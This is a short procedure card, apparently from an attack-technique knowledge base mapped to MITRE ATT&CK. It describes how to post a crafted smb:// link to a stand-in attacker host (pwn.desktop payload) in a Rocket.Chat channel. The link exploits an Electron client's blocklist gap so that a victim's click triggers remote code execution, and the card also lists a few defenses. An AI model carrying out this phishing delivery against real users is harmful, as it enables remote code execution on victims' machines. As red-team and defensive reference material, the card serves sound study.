---
id: proc-send-smb-link
tags:
  - phishing
  - chat-delivery
  - smb
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Electron
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1566.001]]'
updated_at: '2025-12-14T17:23:28.542Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[T1566.001]]'
---
# Send-Malicious-SMB-Link-in-Chat

## Summary

This procedure delivers the smb:// link to the victim through a Rocket.Chat channel, leveraging social engineering to prompt a click that triggers the RCE payload.

## Description

From an attacker account in the shared channel, send a message with the crafted URL (e.g., smb://attacker.tld/public/pwn.desktop). The Electron app renders it as clickable without filtering smb://, unlike file://. This exploits the preload script's blocklist limitation. Outcome: Victim receives and potentially interacts with the link; requires no attachments, just text.

## Requirements

1. Attacker authenticated in the same channel as victim
2. Samba share online and URL valid
3. No additional tools; uses app's messaging

## Defense

Defensive measures and detection strategies:

- Implement URL scanning in chat apps for suspicious protocols (e.g., smb://)
- Train users to avoid clicking untrusted links in chats
- Log and alert on external protocol attempts in Electron apps

## Objectives

1. Deliver payload URL via legitimate chat interface
2. Ensure link appears clickable and non-suspicious
3. Prompt user interaction for execution

## Instructions

### Step 1: Compose and Send Message

**Context**: Use another account to post the link, simulating a trusted sender.

In the Rocket.Chat app, type and send: `smb://attacker.tld/public/pwn.desktop` (replace with real domain).

> Expected output: Message posted with URL hyperlinked in chat.

### Step 2: Verify Delivery

**Context**: Confirm victim-side visibility.

Switch to victim account/session and check channel for the message.

> Expected output: Link visible and clickable in victim's view.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[T1566.001]] Phishing: Spearphishing Attachment (adapted for link)

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- phishing
- chat-delivery
- smb
